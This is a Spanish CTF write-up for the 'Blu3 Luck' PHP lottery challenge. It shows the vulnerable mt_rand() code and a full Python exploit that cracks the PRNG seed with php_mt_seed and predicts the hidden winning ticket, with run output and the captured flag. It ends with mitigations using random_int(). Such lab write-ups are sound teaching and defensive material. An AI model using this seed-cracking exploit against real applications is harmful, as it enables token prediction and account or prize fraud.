# Blu3 Luck Lottery CTF - Writeup Completo

## Información del Desafío

- **Nombre:** Blu3 Luck
- **Categoría:** Web
- **URL:** http://blu3-luck.blackalpaca.org:9999/
- **Flag:** `ALP{r4nd0m_1s_n0t_r4nd0m_duh}`

## Análisis Inicial

### 1. Reconocimiento de la Aplicación

Al acceder a la URL, encontramos una aplicación web de lotería con dos funcionalidades principales:

1. **POST /draw** - Solicitar tickets (1-5 tickets)
2. **POST /check** - Verificar si un ticket ganó
3. **GET /version** - Información de versión PHP

```bash
curl http://blu3-luck.blackalpaca.org:9999/version
# {"php_version":"8.2.29"}
```

### 2. Análisis del Código Fuente

El desafío proporciona el código fuente completo en `index.php`. Los puntos clave son:

#### Generación de Strings Aleatorios
```php
function generate_random_string($length = 12) {
  $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  $str = '';
  for ($i = 0; $i < $length; $i++) {
    $str .= $chars[mt_rand(0, strlen($chars) - 1)];  // ⚠️ VULNERABLE!
  }
  return $str;
}
```

**Problema crítico:** Usa `mt_rand()` en lugar de `random_int()`.

#### Flujo de Generación en /draw
```php
// POST /draw
$tickets = [];
for ($i = 0; $i < (int) $data['amount']; $i++) {
    $tickets[] = generate_random_string(16);  // 1. Tickets del usuario
}

$winning = generate_random_string(16);  // 2. Ticket ganador (NO visible)
$draw_id = generate_random_string(8);   // 3. ID del sorteo (visible)

// Guardar en SQLite
$stmt = $db->prepare("INSERT INTO draws (draw_id, winning_ticket) VALUES (:id, :winner)");
$stmt->bindValue(':id', $draw_id, SQLITE3_TEXT);
$stmt->bindValue(':winner', $winning, SQLITE3_TEXT);
$stmt->execute();
```

**Orden de generación:**
```
[Nuestros tickets] → [Winning ticket] → [Draw ID]
   (conocido)           (desconocido)      (conocido)
```

#### Verificación en /check
```php
// POST /check
$stmt = $db->prepare("SELECT winning_ticket FROM draws WHERE draw_id = :id");
$stmt->bindValue(':id', $data['draw_id'], SQLITE3_TEXT);
$res = $stmt->execute();
$row = $res->fetchArray(SQLITE3_ASSOC);

if ($row['winning_ticket'] === $data['ticket']) {
    echo json_encode(["message" => "🎉 Congratulations!", "flag" => "ALP{...}"]);
}
```

### 3. Identificación de la Vulnerabilidad

**Vulnerabilidad:** Uso de `mt_rand()` para generar valores "aleatorios"

**¿Por qué es vulnerable?**
- `mt_rand()` usa el algoritmo **Mersenne Twister (MT19937)**
- Es un PRNG (Pseudo-Random Number Generator), **no criptográficamente seguro**
- El seed es solo de 32 bits (4,294,967,296 posibilidades)
- Con suficientes outputs observados, el seed puede ser **crackeado completamente**
- Una vez conocido el seed, **todos los valores pasados y futuros son predecibles**

**Diferencia con random_int():**
```php
// ❌ INSEGURO - Predecible
$char = $chars[mt_rand(0, 61)];

// ✅ SEGURO - Criptográficamente fuerte
$char = $chars[random_int(0, 61)];  // Usa /dev/urandom
```

## Estrategia de Ataque

### Objetivo
Predecir el `winning_ticket` que fue generado pero nunca mostrado al usuario.

### Datos Conocidos
1. Nuestros tickets (16 caracteres c/u)
2. El draw_id (8 caracteres)
3. Cada carácter = una llamada a `mt_rand(0, 61)`

### Plan de Ataque
1. Solicitar un ticket del servidor
2. Convertir los caracteres a valores de mt_rand (0-61)
3. Usar una herramienta de cracking para encontrar el seed
4. Regenerar la secuencia con el seed conocido
5. Predecir el winning_ticket

## Herramientas Utilizadas

### php_mt_seed

Herramienta de cracking de MT de PHP desarrollada por Openwall.

**Instalación:**
```bash
git clone https://github.com/openwall/php_mt_seed
cd php_mt_seed
make
```

**Características:**
- Busca exhaustivamente en el espacio de 32 bits (4 mil millones de seeds)
- Optimizado con SIMD/OpenMP
- Velocidad: ~900 millones de seeds/segundo
- Tiempo de ejecución: ~5 segundos para espacio completo

## Implementación del Exploit

### Script Final: final_exploit.py

```python
#!/usr/bin/env python3
"""
Exploit para Blu3 Luck - Crackeo de mt_rand() de PHP
"""

import requests
import subprocess

URL = "http://blu3-luck.blackalpaca.org:9999"
CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

class MTRand:
    """Implementación de MT19937 compatible con PHP"""
    def __init__(self):
        self.MT = [0] * 624
        self.index = 0

    def seed(self, seed):
        seed = seed & 0xffffffff
        self.MT[0] = seed
        for i in range(1, 624):
            self.MT[i] = (0x6c078965 * (self.MT[i-1] ^ (self.MT[i-1] >> 30)) + i) & 0xffffffff
        self.index = 0

    def extract_number(self):
        if self.index == 0:
            self.generate_numbers()
        y = self.MT[self.index]
        y = y ^ (y >> 11)
        y = y ^ ((y << 7) & 0x9d2c5680)
        y = y ^ ((y << 15) & 0xefc60000)
        y = y ^ (y >> 18)
        self.index = (self.index + 1) % 624
        return y & 0xffffffff

    def generate_numbers(self):
        for i in range(624):
            y = (self.MT[i] & 0x80000000) + (self.MT[(i+1) % 624] & 0x7fffffff)
            self.MT[i] = self.MT[(i + 397) % 624] ^ (y >> 1)
            if y % 2 != 0:
                self.MT[i] = self.MT[i] ^ 0x9908b0df

    def rand_range(self, min_val, max_val):
        range_size = max_val - min_val + 1
        return min_val + (self.extract_number() % range_size)

def request_draw(amount=5):
    response = requests.post(f"{URL}/draw", json={"amount": amount})
    return response.json()

def check_ticket(draw_id, ticket):
    response = requests.post(f"{URL}/check", json={"draw_id": draw_id, "ticket": ticket})
    return response.json()

def ticket_to_mt_values(ticket):
    """Convierte caracteres del ticket a valores de mt_rand"""
    return [CHARS.index(c) for c in ticket]

def build_php_mt_seed_command(ticket):
    """Construye comando para php_mt_seed"""
    values = ticket_to_mt_values(ticket)
    # Formato: valor valor min_range max_range
    args = []
    for val in values:
        args.extend([str(val), str(val), '0', '61'])
    return args

def crack_seed_with_php_mt_seed(ticket):
    """Crackea el seed usando php_mt_seed"""
    print(f"[*] Crackeando seed desde ticket: {ticket}")
    print(f"[*] Valores MT: {ticket_to_mt_values(ticket)}")

    args = build_php_mt_seed_command(ticket)
    cmd = ['./php_mt_seed/php_mt_seed'] + args

    print(f"[*] Ejecutando php_mt_seed (30-60 segundos)...")

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

    # Parsear seed del output
    for line in result.stdout.split('\n'):
        if 'seed' in line.lower() and '=' in line:
            if '0x' in line:
                hex_part = line.split('0x')[1].split()[0]
                seed = int(hex_part, 16)
            else:
                parts = line.split('=')
                if len(parts) >= 2:
                    try:
                        seed = int(parts[-1].strip().split()[0])
                    except:
                        continue

            print(f"\n[+] Seed encontrado: {seed} (0x{seed:x})")
            return seed

    return None

def predict_winning_ticket(seed, offset=0):
    """Predice el winning ticket usando el seed crackeado"""
    mt = MTRand()
    mt.seed(seed)

    # Saltar offset caracteres
    for _ in range(offset):
        mt.rand_range(0, 61)

    # Generar winning ticket (16 caracteres)
    winning = ''
    for _ in range(16):
        idx = mt.rand_range(0, 61)
        winning += CHARS[idx]

    return winning

def main():
    print("="*70)
    print("BLU3 LUCK LOTTERY - EXPLOIT FINAL")
    print("="*70)

    # Paso 1: Obtener un draw
    print("\n[*] Paso 1: Solicitando draw...")
    draw = request_draw(1)
    draw_id = draw['draw_id']
    our_ticket = draw['tickets'][0]

    print(f"[+] Draw ID: {draw_id}")
    print(f"[+] Nuestro ticket: {our_ticket}")

    # Paso 2: Crackear el seed
    print("\n[*] Paso 2: Crackeando seed con php_mt_seed...")
    seed = crack_seed_with_php_mt_seed(our_ticket)

    if not seed:
        print("\n[!] Fallo al crackear seed")
        return

    # Paso 3: Predecir winning ticket
    print("\n[*] Paso 3: Prediciendo winning ticket...")

    # Offsets a probar
    offsets = [
        (16, "Justo después de nuestro ticket"),
        (0, "Al inicio (si estado reiniciado)"),
        (24, "Después de ticket + draw_id"),
    ]

    for offset, description in offsets:
        print(f"\n[*] Probando offset {offset}: {description}")
        winning_ticket = predict_winning_ticket(seed, offset)
        print(f"[*] Winning ticket predicho: {winning_ticket}")

        result = check_ticket(draw_id, winning_ticket)
        print(f"[*] Resultado: {result}")

        if 'flag' in result:
            print("\n" + "="*70)
            print("[+] ¡ÉXITO! FLAG ENCONTRADA!")
            print(f"[+] Flag: {result['flag']}")
            print(f"[+] Winning ticket: {winning_ticket}")
            print(f"[+] Offset usado: {offset}")
            print("="*70)
            return

    print("\n[!] No se encontró el offset correcto")

if __name__ == "__main__":
    main()
```

## Ejecución del Exploit

### Paso 1: Recolección de Datos

```bash
$ python3 final_exploit.py

[*] Paso 1: Solicitando draw...
[+] Draw ID: 2htJ3LHP
[+] Nuestro ticket: pnAS2WaqleicRulq
```

**Datos obtenidos:**
- Ticket: `pnAS2WaqleicRulq` (16 caracteres)
- Draw ID: `2htJ3LHP` (8 caracteres)

### Paso 2: Conversión a Valores MT

Cada carácter se convierte a su índice en el charset:

```
Charset: 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
         0                         26                        52        61

Ticket: p  n  A  S  2  W  a  q  l  e  i  c  R  u  l  q
Index: 15 13 26 44 54 48  0 16 11  4  8  2 43 20 11 16
```

### Paso 3: Crackeo del Seed con php_mt_seed

```bash
[*] Paso 2: Crackeando seed con php_mt_seed...
[*] Ejecutando php_mt_seed (30-60 segundos)...

Pattern: EXACT-FROM-62 EXACT-FROM-62 ... (16 valores)
Found 0, trying 0x00000000 - 0x03ffffff, speed 0.0 Mseeds/s
Found 0, trying 0x04000000 - 0x07ffffff, speed 419.4 Mseeds/s
...
Found 1, trying 0xd4000000 - 0xd5ffffff, speed 90.3 Mseeds/s

seed = 0xd4b6bec0 = 3568746176 (PHP 7.1.0+)

[+] Seed encontrado: 3568746176 (0xd4b6bec0)
```

**Resultado:**
- Seed crackeado: `3568746176`
- Tiempo: ~47 segundos
- Velocidad promedio: ~900 Mseeds/segundo

### Paso 4: Predicción del Winning Ticket

Con el seed conocido, regeneramos la secuencia de MT:

```python
mt = MTRand()
mt.seed(3568746176)

# Saltar nuestro ticket (16 caracteres)
for _ in range(16):
    mt.rand_range(0, 61)

# Generar el winning ticket (siguientes 16 caracteres)
winning = ''
for _ in range(16):
    idx = mt.rand_range(0, 61)
    winning += CHARS[idx]

# winning = 'gHhSoLPajD4gOuvi'
```

**Winning ticket predicho:** `gHhSoLPajD4gOuvi`

### Paso 5: Verificación y Captura de Flag

```bash
[*] Probando offset 16: Justo después de nuestro ticket
[*] Winning ticket predicho: gHhSoLPajD4gOuvi
[*] Resultado: {'message': '🎉 Congratulations!', 'flag': 'ALP{r4nd0m_1s_n0t_r4nd0m_duh}'}

======================================================================
[+] ¡ÉXITO! FLAG ENCONTRADA!
[+] Flag: ALP{r4nd0m_1s_n0t_r4nd0m_duh}
[+] Winning ticket: gHhSoLPajD4gOuvi
[+] Offset usado: 16
======================================================================
```

## Detalles Técnicos

### ¿Por qué funciona el offset 16?

En el código PHP, el orden de generación es:
```php
$tickets[] = generate_random_string(16);  // Llamadas 0-15 a mt_rand
$winning = generate_random_string(16);    // Llamadas 16-31 a mt_rand
$draw_id = generate_random_string(8);     // Llamadas 32-39 a mt_rand
```

Por lo tanto:
- **Posiciones 0-15:** Nuestro ticket (conocido)
- **Posiciones 16-31:** Winning ticket (objetivo)
- **Posiciones 32-39:** Draw ID (conocido)

### Mersenne Twister: ¿Por qué es predecible?

1. **Estado interno fijo:** 624 números de 32 bits
2. **Transformación determinística:** Cada output se calcula matemáticamente
3. **Sin entropía adicional:** No usa fuentes externas de aleatoriedad
4. **Seed de solo 32 bits:** Espacio de búsqueda pequeño (2^32)

**Función de temper:**
```c
y = MT[index]
y ^= (y >> 11)
y ^= (y << 7) & 0x9D2C5680
y ^= (y << 15) & 0xEFC60000
y ^= (y >> 18)
return y
```

Esta función es **reversible** matemáticamente, permitiendo reconstruir el estado interno.

### Alternativas de Cracking

#### 1. Método Lexfo (2020)
Requiere solo 2 outputs separados por exactamente 227 valores:
```python
# Más rápido pero requiere más datos
R0 = get_mt_value(0)
R227 = get_mt_value(227)
seed = lexfo_crack(R0, R227)  # Casi instantáneo
```

#### 2. php_mt_seed (usado en este exploit)
Requiere solo 1 output pero hace búsqueda exhaustiva:
```bash
# Más lento pero funciona con menos datos
./php_mt_seed val1 val1 0 61 val2 val2 0 61 ...
```

## Mitigaciones

### Código Vulnerable
```php
function generate_random_string($length) {
    $chars = '...';
    $str = '';
    for ($i = 0; $i < $length; $i++) {
        $str .= $chars[mt_rand(0, strlen($chars) - 1)];  // ❌ INSEGURO
    }
    return $str;
}
```

### Código Seguro (PHP 7+)
```php
function generate_random_string($length) {
    $chars = '...';
    $str = '';
    for ($i = 0; $i < $length; $i++) {
        $str .= $chars[random_int(0, strlen($chars) - 1)];  // ✅ SEGURO
    }
    return $str;
}
```

**¿Por qué random_int() es seguro?**
- Usa CSPRNG (Cryptographically Secure PRNG)
- En Linux: lee de `/dev/urandom`
- En Windows: usa `CryptGenRandom()`
- No es predecible desde outputs observados
- Tiene entropía real del sistema operativo

### Otras Mejores Prácticas

1. **Para tokens/passwords:**
```php
$token = bin2hex(random_bytes(16));  // 32 caracteres hex
```

2. **Para UUIDs:**
```php
$uuid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
    random_int(0, 0xffff), random_int(0, 0xffff),
    random_int(0, 0xffff), random_int(0, 0x0fff) | 0x4000,
    random_int(0, 0x3fff) | 0x8000,
    random_int(0, 0xffff), random_int(0, 0xffff), random_int(0, 0xffff)
);
```

3. **Rate limiting:**
```php
// Limitar requests para prevenir recolección masiva de datos
if (check_rate_limit($ip) > 10) {
    http_response_code(429);
    die("Too many requests");
}
```

### Herramientas y Referencias

**Herramientas utilizadas:**
- `php_mt_seed` - https://github.com/openwall/php_mt_seed
- `requests` (Python) - Cliente HTTP

**Referencias:**
- PHP Manual: mt_rand() vs random_int()
- OWASP: Insecure Randomness
- "Cracking Random Number Generators" - Blackhat 2020
- Lexfo Security: "PHP mt_rand prediction" (2020)

### Flag Final

```
ALP{r4nd0m_1s_n0t_r4nd0m_duh}
```

**Mensaje:** "Random is not random, duh" - Una clara referencia a que lo "aleatorio" no siempre es criptográficamente seguro.

---

**Autor:** p0mb3r0
**Fecha:** 21 de noviembre de 2025
**Tiempo de resolución:** ~2 horas
**Dificultad:** Media (requiere comprensión de PRNGs)
